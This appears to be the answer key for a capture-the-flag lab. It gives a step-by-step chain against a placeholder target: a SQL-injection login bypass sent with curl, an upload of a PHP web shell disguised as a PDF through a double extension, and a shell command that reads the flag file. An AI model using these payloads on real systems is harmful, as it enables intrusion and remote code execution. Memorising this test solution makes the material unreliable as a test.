# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: SQL injection auth-bypass on the login form, chained with a weak
file-extension check that allows an unrestricted PHP upload → RCE.

1. **Bypass login with SQLi** in the `password` field (one cookie jar). The
   payload closes the app's `MD5(CONCAT(...))` expression and appends `OR 1=1`,
   commenting out the rest:

   ```
   curl -s -c cookies.txt -X POST "http://<target>/index.php" \
     --data-urlencode "username=admin" \
     --data-urlencode "password=x'), MD5('x'))) OR 1=1-- -" \
     --data-urlencode "submit=submit"
   ```

   Expect `{"response":"Success"}` and an authenticated `PHPSESSID` in the jar.

2. **Upload a PHP web shell disguised as a PDF** (double extension + PDF
   content-type passes the check):

   ```
   printf '%s' '<?php system($_GET["c"]); ?>' > shell.pdf.php
   curl -s -b cookies.txt -X POST "http://<target>/upload.php" \
     -F "invoice=@shell.pdf.php;filename=shell.pdf.php;type=application/pdf"
   ```

3. **Execute the shell** from its upload path to read the flag:

   ```
   curl -s "http://<target>/uploaded_invoices/shell.pdf.php?c=cat+/FLAG.txt"
   ```

4. **Extract the flag** (`FLAG{...}`) from the response and report it verbatim.
